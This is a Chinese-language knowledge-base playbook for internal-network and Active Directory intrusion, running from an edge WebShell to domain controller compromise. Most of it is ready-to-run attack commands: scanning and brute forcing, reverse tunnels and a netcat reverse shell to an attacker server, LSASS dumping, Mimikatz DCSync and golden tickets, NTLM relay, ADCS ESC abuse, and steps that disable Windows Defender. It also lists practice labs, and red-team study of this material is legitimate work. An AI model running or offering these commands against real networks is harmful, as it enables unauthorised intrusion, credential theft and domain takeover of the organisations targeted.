---
name: kb-intranet-lateral-domain
description: 内网渗透与域渗透全链路实战手册——从边界机 WebShell 到拿下域控。拓扑测绘/隧道代理/主机横移/凭据抓取/AD全攻击链/工具速查/EDR对抗/靶场。已按 2024-2026 最新研究修订（ADCS ESC13-15、CVE-2025-33073 NTLM反射、RBCD跨域等）
tags: [内网渗透, 域渗透, AD, 横向移动, 隧道]
date: 2026-08-14
---

# 内网渗透与域渗透全链路手册

> 读者画像：已有 Web 黑盒 getShell 能力。本文目标：从「边界机 WebShell / 权限」走到「域控」。
> 前置检查：先 `ipconfig /all`、`systeminfo` 确认主机是否加域（域内→跳 §6；纯工作组→走 §4 横移+信息搜集先找域）。

---

## 一、内网拓扑测绘（拿下一台后的第一步）

目标：回答「内网有多大、有哪些网段、哪些关键服务、DC 在哪」。

```powershell
# 手工三连（任何平台先做）
ipconfig /all & arp -a & netstat -ano          # Win：本机 IP/网关/网段 + ARP 邻居 + 已建连接
route print                                     # Win：路由表，看内网段
arp -a && ip addr && netstat -ant               # Linux 对应
```

```bash
# fscan（首选，单二进制，Linux/Win 通吃）
fscan -h 192.168.1.0/24                       # 全端口+常见漏洞（默认也打爆破）
fscan -h 192.168.1.0/24 -p 1-65535            # 大网段谨慎，先默认再扩
fscan -h 192.168.1.1-254 --no-ping -np        # 禁 ping 存活探测，直接 TCP
fscan -h 192.168.1.0/24 -hn 192.168.1.8       # 排除已控主机，收敛噪音
fscan -h 192.168.1.0/24 -m smb -pwd xxx -user administrator   # 专项 SMB 口令/哈希爆破
```

```text
fscan 输出重点字段：MS17-010(永恒之蓝) / SMB弱口令 / MSSQL弱口令 / WebTitle(web资产) / NBT(主机名=域信息线索)
```

- **Ladon**（Windows GUI/CLI，适合已控 Windows 上用）：`Ladon.exe 192.168.1.0/24 PortScan` / `Ladon.exe 10.1.1.1 SMBScan`
- **网段发现**：`fscan -h 192.168.1.0/24` 后看 ARP/路由；多网段用路由表+被动流量猜。双网卡机器是宝贵跳板。
- **资产清单落盘**：主机IP | 主机名 | 端口/服务 | 是否DC | 口令 | 已控标记。用表格记录，后文每步都往这表里填。

> ⚠️ 拿到权限后立刻做的事：`whoami /priv`（SeDebugPrivilege=能dump）、`whoami /groups`（有域组=域内）、把主机名/域DNS名记下来——这决定你走哪条链。

---

## 二、代理链与隧道

选型原则：**能不出网就不开流量**；目标能出 TCP → frp/Ligolo；只能出 HTTP(S) 443 → Suo5；只能出 DNS/ICMP → 隧道协议。

### 2.1 frp（通用反向代理，内网不出网时主动连外）

```ini
# frps 服务端（你的 VPS <your-attack-server>）
[common]
bind_port = 7000
token = xxxx
# frpc 客户端（内网已控机）
[common]
server_addr = <your-attack-server>
server_port = 7000
token = xxxx
[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

```bash
# 起服务：./frps -c frps.ini ；起客户端：./frpc -c frpc.ini
# 之后 proxychains socks5 127.0.0.1 1080 走内网；frp 也支持 stcp(加密)/xtcp(P2P)/udp
```

### 2.2 Suo5（WebShell 场景最优：目标只开 80/443 Web 端口）

```bash
# 服务端(攻击机)监听
suo5 -l 0.0.0.0:1081 -S
# 目标侧上传 suo5.jsp/suo5.aspx（内存马版适合 Resin/Tomcat），URL 形如：
#   http://target/suo5.jsp?key=xxx
# 客户端连接 → 本地 SOCKS5 1081，流量伪装成 HTTP Chunked，性能≈frp
# 适用：仅 Web 端口出网、Neo-reGeorg 太慢、中间件不支持重 Georg 时
```

### 2.3 Ligolo-ng（TUN 层隧道，体验=直连内网，二层能力，扫端口/打 exploit 首选）

```bash
# 攻击机起 server（Linux）
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
# 内网机起 agent（Win/Linux 都有，可用 -ignore-cert）
./agent -connect <your-attack-server>:11601 -ignore-cert
# 回到 server 控制台：
#   session → 选择 agent → ifconfig（分配内网虚拟网卡）→ sudo ip route add 10.10.0.0/24 dev <tun0>
# 之后直接 nc/浏览器/打 exploit 访问内网 IP，无需 proxychains，支持 UDP/ICMP/syn扫描
```

### 2.4 ew / nps（老旧但常备）

```bash
# ew：反向 socks，穿透无需公网端口映射
#   VPS: ./ew_for_linux_64 -s rcsocks -l 1080 -e 8888
#   内网: ew_for_Win.exe -s rssocks -d <your-attack-server> -e 8888
# nps：frp 同类，web 管理面板，支持端口复用/多级代理，配置在 nps.conf 与 web 后台
```

### 2.5 单端口流量转发（轻量，无协议代理）

```bash
nc -l -p 4444 -e /bin/sh            # Linux 弹回 shell（老，容易断）
socat TCP-LISTEN:8888,fork TCP:10.10.10.5:3389   # 本地端口→内网 RDP 转发
ssh -R 0.0.0.0:7000:10.10.10.5:80 root@<your-attack-server>   # 反向隧道，把内网80映射到VPS 7000
ssh -L 1080:127.0.0.1:1080 root@<your-attack-server>           # 正向 socks，本机1080→VPS
# chisel：Go 写，一条命令双向隧道，比 socat 省事：server: chisel server -p 9000；client: chisel client VPS:9000 R:1080:socks
```

### 2.6 DNS / ICMP 隧道（仅剩 DNS/ICMP 出网时的最后手段）

```bash
# iodine（DNS 隧道，带宽最好）
#  VPS(需注册 NS 指向你): iodine -f -P pwd 100.100.1.1 tunnel.dns.domain
#  内网机: iodine -f -P pwd tunnel.dns.domain
# dnscat2（DNS 上跑 C2 协议，稳）
#  VPS: dnscat2-server domain.com
#  内网: dnscat2 --dns server=VPS,port=53 --secret=pwd
# pingtunnel（ICMP 隧道，绕过只拦 TCP 的 egress）
#  VPS: ./pingtunnel -type server
#  内网: ./pingtunnel -type client -l 4455 -s VPS -t 10.10.10.5:445
```

---

## 三、主机横向手法

前提：拿到一组凭据/哈希/票据。用 §1 资产清单逐台打。

### 3.1 凭据批量验证与执行（NetExec，CME 的继任者）

```bash
# 批量验证口令/哈希，Pwn3d! = 该机本地管理员可执行，绿灯
nxc smb 192.168.1.0/24 -u user -p 'Passw0rd!'
nxc smb 192.168.1.0/24 -u Administrator -H <NTLMhash>
nxc smb 192.168.1.0/24 -u user -p pass --local-auth          # 工作组/本地账户
# 执行（-x = 命令）可选 exec-method：smbexec(留服务痕迹,Event7045) / wmiexec(不留服务) / atexec(计划任务)
nxc smb <ip> -u user -p pass -x 'whoami'
nxc winrm <ip> -u user -p pass -X 'ipconfig /all'            # WinRM 最干净，长得像正常运维
```

### 3.2 各执行通道详解

```bash
# PsExec 类：走 admin$ 服务创建，需要 SMB445 + admin 共享
impacket-psexec 'corp/user:Pass@10.10.10.5'
impacket-psexec -hashes :<NTLM> corp/admin@10.10.10.5
# WMI 类：DCOM/RPC，不写服务、不落盘，SMB 签名无关，隐蔽
impacket-wmiexec 'corp/user:Pass@10.10.10.5'
# 计划任务类：atexec，SCM 被封时的替代
impacket-atexec 'corp/user:Pass@10.10.10.5' 'whoami'
# WinRM 交互 shell（5985/5986 开着首选）
evil-winrm -i 10.10.10.5 -u user -p Pass        # 或 -H <NTLM>
```

### 3.3 SMB 共享 / 文件落地

```bash
net use \\10.10.10.5\c$ /user:corp\user Passw0rd!   # Win 挂载 C$
impacket-smbclient 'corp/user:Pass@10.10.10.5'     # Linux 访问共享
# 传文件：smbclient 的 put/get；nxc 直接拉: nxc smb <ip> -u u -p p --get-file C:\x.txt ./x.txt --share C$
# 常见猎取目录：C$\Users\*\Desktop、C$\Users\*\Documents、共享盘 *\IT 密码表
```

### 3.4 SSH 私钥复用 / Linux 横移

```bash
# 拿到 Linux 主机后：找 ~/.ssh/、/root/.ssh/authorized_keys、history 里的口令
find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null
ssh -i id_rsa user@10.10.10.x
grep -R "password" /var/log /opt /home 2>/dev/null   # 脚本/配置里的硬编码口令
# 横向跳板：.ssh/config 里的 Host 别名=已知可信目标
```

### 3.5 Web 服务器横向（常见被忽略面）

- 内网 Tomcat：`/manager/html` 弱口令→上传 war getshell
- Jenkins：`/script` 脚本控制台 Groovy RCE
- Weblogic：console 未授权（CVE-2020-14882）+ 反序列化
- 内网 Redis 未认证→写计划任务/SSH key；Nacos/XXL-JOB 默认口令→RCE
- 双网卡 Web 服务器 = 天然跳板，先打它的另一个网段

---

## 四、凭据抓取与利用

拿到 **SYSTEM 或 SeDebugPrivilege** 后立刻抓，主攻 **LSASS**（内存里躺着所有登录过的明文/NTLM）。

```powershell
# Mimikatz（Win，目标本机）
privilege::debug
sekurlsa::logonpasswords          # 明文+哈希（Win10/11 明文大多拿不到，哈希可用）
lsadump::sam                      # 本地 SAM 哈希
lsadump::lsa /patch               # 系统服务账户哈希
sekurlsa::tickets /export         # 导出票据(PtT 用)
lsadump::dcsync /domain:corp.local /user:krbtgt    # DC 上直取 krbtgt（黄金票据原料）
```

```powershell
# 杀软/EDR 在，不直接跑 Mimikatz → 先 Dump 离线解析（LOTL，最稳）
procdump64.exe -accepteula -ma lsass.exe lsass.dmp     # 改名放非标准路径更稳
# 或系统自带（无需额外工具，LSA 保护开时 comsvcs 也常被拦）：
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full
# 离线解析（攻击机）：
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
pypykatz lsa minidump lsass.dmp                          # 纯 Python，Linux 上可跑
```

### LSA 保护/PPL 对抗（Win11 默认开 PPL）

- 有本地管理员但杀软不拦：尝试 `mimikatz !+`（用自带驱动去 PPL），驱动被杀软查就换法。
- 2025 实战技巧：**WerFaultSecure.exe**（Win8.1 遗留文件）以 WinTCB PPL 跑在 Win11 24H2 上，可用 `CreateProcessAsPPL` 拉起后触发 `/h /pid /file` 开关出未加密 dump（详见 Sources 文末）。
- 纯离线对抗：在**域控或另一台能抓的主机**抓；或抓 `ntds.dit`（见 §6 DCSync）。攻防重点是「行为检测」，签名检测已死。

```bash
# 其他凭据源
# LaZagne（全平台，扫浏览器/数据库/IM/Wifi 明文）
laZagne.exe all
# 浏览器凭据（Win）：拉 %APPDATA%\Mozilla\Firefox\Profiles\*\logins.json + key4.db 离线解
# DPAPI 主密钥（Win，可解 chrome/凭据管理器/IE）：Mimikatz dpapi::cred 或 DonPAPI
impacket-secretsdump 'corp/admin:Pass@10.10.10.5'        # 远端抓 SAM/LSA，无需登录
nxc smb <ip> -u admin -p pass --sam / --lsa / --ntds     # 或 --ntds 直接提 ntds.dit
```

---

## 五、域渗透全链路（核心）

### 5.0 域基础概念（30 秒过一遍）

- **域控制器 DC**：存所有账户的 NTLM/Kerberos 数据库（ntds.dit）→ 拿下 DC = 拿整个域。
- **TGT / TGS**：Kerberos 票据。TGT=身份证（krbtgt 签），TGS=服务门票。
- **NTLM 哈希**：NTDS 里存的是 NTLM 哈希，不是明文——PTH 用它。
- **关键账户**：`krbtgt`（签 TGT，黄金票据原料）、`Administrator`（域管，通常禁远程）、机器账户 `$`。
- 拿到任意域内用户凭据 = 起点；目标 = `Domain Admins` 或直接 DCSync。

### 5.1 信息收集：BloodHound / SharpHound（画攻击路径）

```bash
# 域内 Win 上（-c All 最全但吵，5-15min；要静音用 -c DCOnly 或 Session 循环）
.\SharpHound.exe -c All -d corp.local
# Linux 上（已有一组凭据，不出内网也可跑）
bloodhound-python -u user -p Pass -d corp.local -ns <DC_IP> -c All
nxc ldap <DC_IP> -u user -p pass --bloodhound --collection All
# 结果 ZIP 拖进 BloodHound CE（docker 起，http://localhost:8080，admin/bloodhoundcommunityedition）
```

**必看内置查询**：到 Domain Admins 的最短路径 / DCSync 权限持有者 / 可 Kerberoast 的高权用户 / 可 AS-REP Roast 用户 / 可写 GPO 的对象。
**高频 Cypher**：
```cypher
MATCH p=shortestPath((n)-[*1..]->(g)) WHERE g.name =~ "(?i).*domain admins.*" RETURN p
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames   -- Kerberoast
MATCH (u:User {dontreqpreauth:true}) RETURN u.name                    -- AS-REP
```

### 5.2 Kerberoast / AS-REP Roast（低危凭据→高权哈希）

```bash
# Kerberoast（需任意域用户凭据；SPN 账户的 TGS 加密是 RC4/AES，可离线爆）
Rubeus.exe kerberoast /outfile:hashes.txt                      # Win
impacket-GetUserSPNs 'corp.local/user:Pass' -dc-ip <DC> -request > hashes.txt   # Linux
hashcat -m 13100 hashes.txt rockyou.txt                        # 爆破
# 有 GenericWrite 可做 Targeted Kerberoast：给目标加 SPN 再 roast
# AS-REP Roast（无需密码，只要用户名；针对开启了"不要求预认证"的账户）
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip <DC> -format hashcat -outputfile asrep.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### 5.3 PTH / PtT（拿哈希/票据直接过）

```bash
# Pass-the-Hash：NTLM 哈希=密码，SMB/WinRM/WMI/MSSQL/RDP 通吃
nxc smb <ip> -u Administrator -H <NTLM> --local-auth
evil-winrm -i <ip> -u Administrator -H <NTLM>
impacket-psexec -hashes :<NTLM> 'corp/Administrator@<ip>'
xfreerdp3 /u:Administrator /v:<ip> /pth:<NTLM>                # RDP PTH（需 RestrictedAdmin）
# Pass-the-Ticket：导入票据
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass 'corp/svc@dc01.corp.local'
Rubeus.exe ptt /ticket:xxx.kirbi                              # Win
```

### 5.4 NTLM Relay + 强制认证（把"认证"转发成"命令执行"）

```bash
# 核心链：PetitPotam/PrintBug 强打目标认证到攻击机 → ntlmrelayx 转发到目标服务
impacket-ntlmrelayx -t smb://<victim> -smb2support -c 'whoami'     # relay 到 SMB 执行
# 拿域内"机器账户配额(默认10)"滥用：先 MAQ 建机器账户，relay 到 LDAP 写 RBCD
impacket-ntlmrelayx -t ldap://<DC> --delegate-access
# 强制认证工具：PetitPotam(EFSR) / PrintBug(RPRN) / CoerceDance / DFSCoerce
impacket-petitpotam -u user -p pass <attacker_ip> <victim_ip>
```

> 🔥 **2025 重大更新（CVE-2025-33073，NTLM 反射复活）**：任意低权域用户 + 目标未强制 SMB 签名 → 直接在目标机拿到 SYSTEM。原理：向 DNS 注册含 `CREDENTIAL_TARGET_INFORMATION` 的伪造记录，诱导 Windows 认为在访问自己而优先走 NTLM，攻击者把认证反射回原主机。工具 `cupntlm`（自动化 DNS 注入+PetitPotam+ntlmrelayx）。**SMB 签名仍是唯一能防住它的开关**。未打补丁且 DC 无强制签名时可直接 SYSTEM on DC → DCSync。详见文末 Sources。

### 5.5 黄金票据 / 白银票据（拿下 krbtgt / 服务账号哈希后）

```powershell
# 黄金票据：需 krbtgt NTLM（DCSync 或 ntds 提取）+ 域 SID
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt"   # 拿 hash + SID
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt"
# 白银票据：伪造单服务 TGS，需服务账户哈希（如 DC 的 CIFS/机器账户 hash）
mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /target:dc01.corp.local /service:cifs /rc4:<machine_hash> /ptt"
# 之后直接访问：dir \\dc01\c$  /  impacket-psexec -k -no-pass 'corp/Administrator@dc01'
```

### 5.6 域内提权三板斧（凭据不够时的横移放大）

1. **GPO 滥用**：`GenericWrite` 于某个 GPO → 写计划任务/启动脚本 → 组内成员机器上线。工具 `SharpGPOAbuse` / `bloodyAD set gpo`。
2. **ADCS 证书服务（2024-2025 最新全家桶）**：找模板/映射配置错误，用 `certipy-ad` 全流程：
   ```bash
   certipy-ad find -u user@corp.local -p Pass -dc-ip <DC> -vulnerable    # 扫 ESC1-15
   # ESC1(模板允许任意 SAN)：请求→改 upn→拿域管证书
   certipy-ad req -u user@corp.local -p Pass -ca <CA> -template <T> -upn administrator@corp.local
   certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
   # ESC8(NTLM relay 到 HTTP CA Web接口)：ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp
   ```
   **ESC13**（模板 EKU 映射高权组）→ `certipy req -template ESC13 -ca <CA>` + `certipy auth -pfx` 直接获得组内 TGT。**ESC14**（对 altSecurityIdentities 有写权 → 显式映射接管账户，工具 `Stifle.exe`）。**ESC15 / CVE-2024-49019 "EKUwu"**（V1 模板信任申请者注入的 application policy → 注入 Client Auth/证书请求代理，绕过 EKU 限制，2024-11 补丁前全中）。
3. **打印服务/打印洞**：PrintSpooler（CVE-2021-1675/CVE-2021-34527 已补，但 `PrinterBug` 强制认证仍可用）→ relay。**MS-RPRN/RPRN 强制认证**在任何打印服务开的机器上可用。

### 5.7 域间信任攻击（多域/森林）

- **SID History**：信任域间利用 `sidHistory` 注入高权 SID → 访问信任域（工具 `Invoke-SIDHistory` / `goldenPac`）。
- **跨域 RBCD（2025 新进展）**：`GenericWrite` 跨信任域机器对象 → 写 `msDS-AllowedToActOnBehalfOfOtherIdentity` → S4U2Self/S4U2Proxy 提权。注意新 DC（2022+）已禁 RC4，SPN-less 变体可能失效（Synacktiv 研究，见 Sources）。
- **信任方向**：只能往"信任你的方向"打。`nltest /domain_trusts` 看信任关系。

---

## 六、工具命令速查表

| 工具 | 平台 | 核心用法 |
|------|------|---------|
| fscan | Win/Linux | `fscan -h 192.168.1.0/24` 一键存活+漏洞 |
| Ladon | Win | `Ladon.exe <网段> PortScan` GUI 全家桶 |
| frp | 跨平台 | `./frpc -c frpc.ini` 反向 socks，见 §2.1 |
| Suo5 | Web中间件 | 传 suo5.jsp + `suo5 -l 1081` 连，HTTP 隧道 |
| Ligolo-ng | Win/Linux | `agent -connect VPS:11601` + server `ifconfig`，TUN 直连 |
| ew | 跨平台 | `-s rcsocks/rssocks` 反向 socks |
| chisel | 跨平台 | `chisel client VPS:9000 R:1080:socks` 一条命令隧道 |
| iodine/dnscat2/pingtunnel | 跨平台 | DNS/ICMP 隧道，见 §2.6 |
| nxc(NetExec) | Linux | `nxc smb <ip> -u u -p p -x 'whoami'` 验证+横移，Pwn3d! 信号 |
| impacket-psexec/wmiexec/atexec | Linux | 各执行通道，`-hashes :<NTLM>` PTH |
| evil-winrm | Linux | `evil-winrm -i ip -u u -H <NTLM>` WinRM 交互 |
| mimikatz | Win | `sekurlsa::logonpasswords` / `lsadump::dcsync` |
| procdump / comsvcs | Win | `-ma lsass.exe lsass.dmp` 离线抓 LSASS |
| pypykatz | Linux | `pypykatz lsa minidump lsass.dmp` 离线解析 |
| LaZagne | 跨平台 | `laZagne.exe all` 全量明文凭据 |
| SharpHound / bloodhound-python | Win/Linux | BH 采集，见 §5.1 |
| BloodHound CE | Web | `docker-compose up`，分析最短路径 |
| Rubeus | Win | `kerberoast / asreproast / asktgt / ptt` Kerberos 全家桶 |
| impacket-GetUserSPNs / GetNPUsers | Linux | Kerberoast / AS-REP Roast |
| ntlmrelayx + PetitPotam | Linux | relay + 强制认证，见 §5.4 |
| certipy-ad | Linux | `find -vulnerable / req / auth` ADCS 全套 ESC |
| Stifle | Win | `Stifle.exe add /object:target /certificate:<b64>` ESC14 接管 |
| krbrelayx | Linux | Kerberos 反射 relay（CVE-2025-33073 变体） |
| SharpGPOAbuse / bloodyAD | Win/Linux | GPO 滥用 / LDAP 写属性（含 RBCD） |

---

## 七、常见坑与绕过

1. **杀软/EDR 拦 Mimikatz**：先 `procdump`/`comsvcs.dll` dump 离线解；或迁到未被控的目标机抓；工具改名+非标准路径+签名检测已死，重点是别触发行为规则（不直接访问 LSASS、少创建服务）。
2. **PPL/LSA Protection**：`mimikatz !+` 驱动被拦 → WerFaultSecure 手法 / 换 dump 点 / 直接用 DCSync 拉 ntds 绕过本机 LSASS。
3. **WinRM 关闭（5985 不通）**：换 `wmiexec`（DCOM 135）或 `smbexec`（445）或 `atexec`（计划任务）。NetExec 的 `-M` 模块可一键 `rdp -o ACTION=enable`。
4. **SMB 签名强制**：`--no-bruteforce` / relay 需 `-smb2support`，签名强制时 relay 打不了 SMB → 换 relay 到 LDAP/RPC/HTTP(ADCS ESC8)。
5. **网络分段/微隔离**：内网横向打不通 → 找双网卡跳板、被白名单的"跳板机"、共享口令复用；fscan 出的每台机都可能是下一个出口。
6. **无域/纯工作组**：先本地提权 + 抓 SAM，常见场景是同口令/前缀口令横移（`pass-pol` 看密码策略）。
7. **Windows Defender 实时扫描**：落地 payload 前先 `MpCmdRun.exe -RemoveDefinitions -All`（需管理员）或 `Set-MpPreference -DisableRealtimeMonitoring $true`，注意蓝队会看注册表。
8. **新 DC/Server 2022+ 禁 RC4**：老 SPN-less RBCD、部分 relay 链失效，优先 AES 与 2025 新链（见 §5.6/§5.7）。
9. **票据时间敏感**：黄金/白银票据有效期默认 10 年+，但 krbtgt 哈希被轮换则作废；操作前同步 `clock`（Kerberos 容差 5min，`ntpdate`/`w32tm`）。

---

## 八、实战靶场与资源

- **GOAD (Game Of Active Directory)**：Orange Cyberdefense 出的多域漏洞 AD 靶场，覆盖 Kerberoast/DCSync/委派等全链。`github.com/Orange-Cyberdefense/GOAD`；可用 Ludus 一键部署（含 GOAD-Light / SCCM / NHA 变体）。
- **红日靶场（Vulnstack）**：国内经典内网渗透靶场（vulnstack1-7），配套教程多，Workgroup+域混合。`github.com/vulnstack/` 或 `https://www.freebuf.com/articles/web/` 搜索"红日靶场"。
- **HackTheBox**：AD 类机器 + 官方 cheatsheet（"HackTheBox AD Pentesting Cheat-Sheet"）。
- **VulnHub**：搜 `Active Directory` / `Tomghost` 等含域标签镜像。
- **Building your own lab**：`BadBlood`（自动建漏洞域）、`Vulnerable-AD`（vulnlab 域生成）、`DetectionLab`。
- **经典文章/手册**：
  - Orange Cyberdefense AD Mindmap（攻击路径总图）
  - HackTricks - Windows Hardening / Active Directory Methodology
  - ired.team - Windows 域攻击章节
  - The Hacker Recipes（thehacker.recipes，AD/ADCS 全套最新）
  - Synacktiv / SpecterOps（BloodHound 官方）博客——ADCS ESC13-15、跨域 RBCD、CVE-2025-33073 一手来源

---

## Sources（2024-2026 最新手法核对）

- ADCS ESC13/14/15：GOAD walkthrough — https://mayfly277.github.io/posts/ADCS-part14/
- Stealthy AD CS Reconnaissance (certipy parse) — https://blog.compass-security.com/2025/02/stealthy-ad-cs-reconnaissance/
- ESC15 "EKUwu" CVE-2024-49019 分析 — https://adg.csdn.net/69707c0e437a6b40336a72ca.html
- Stifle（ESC14 显式映射接管工具）— https://github.com/logangoins/Stifle
- CVE-2025-33073 NTLM 反射复活（Synacktiv 深度分析）— https://halloween.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
- Reflective Kerberos Relay Attack（RedTeam Pentesting）— https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/
- cupntlm（CVE-2025-33073 自动化利用）— https://github.com/EgCupCake/cupntlm-Automated-Exploit-For-CVE-2025-33073-
- Kerberos 委派滥用（RBCD/Shadow Credentials/KrbRelayUp）— https://github.com/sliverarmory/KrbRelayUp
- 跨域/跨森林 RBCD（Synacktiv）— https://halloween.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2
- BloodHound CE / SharpHound 采集与查询 — https://github.com/SpecterOps/BloodHound · https://www.redfoxsec.com/blog/bloodhound-cheat-sheet
- NetExec 横向与后渗透速查 — https://github.com/Pennyw0rth/NetExec · https://kalilinuxtutorials.com/netexec-cheatsheet/
- Mimikatz / LSASS dump 速查 — https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/
- WerFaultSecure.exe PPL 绕过（Win11 24H2）— https://blogs.npav.net/blogs/post/hackers-exploit-legacy-werfaultsecureexe-to-bypass-ppl-and-steal-lsass-credentials-on-windows-11-24h
- AD 靶场：GOAD — https://github.com/Orange-Cyberdefense/GOAD · Ludus 集成 — https://deepwiki.com/badsectorlabs/ludus
- AD 资源清单（BadBlood/Vulnerable-AD/DetectionLab）— https://github.com/daniellowrie/ActiveDirectory-Pentest-Resources
- 隧道工具对比（Suo5/Ligolo-ng）— https://www.yuque.com/ieice123/mnp0io/sza9u1o37n3x1snk · https://get-shell.com/7713.html
